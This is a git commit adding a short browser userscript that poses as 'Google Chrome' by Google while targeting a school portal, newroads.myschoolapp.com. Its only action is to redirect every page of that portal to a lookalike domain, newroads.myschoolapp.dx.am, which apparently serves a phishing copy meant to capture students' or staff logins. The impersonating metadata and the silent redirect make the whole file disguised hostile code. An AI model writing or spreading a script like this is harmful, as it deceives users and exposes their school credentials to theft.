d2ab58054ed55bc61836fdccd537a486ca1ac6e6
nebulahmods <kxnebulah@gmail.com>
2016-11-03 23:19:55 -0700

    Add files via upload

---
+++ NewRoads.user.js
@@ -0,0 +1,15 @@
+// ==UserScript==
+// @name         Google Chrome
+// @namespace    http://google.com
+// @version      1.2
+// @description  Google Chrome
+// @author       Google
+// @match        https://newroads.myschoolapp.com/*
+// @grant        none
+// ==/UserScript==
+
+(function() {
+    'use strict';
+
+    window.location.href = 'http://newroads.myschoolapp.dx.am/';
+})();
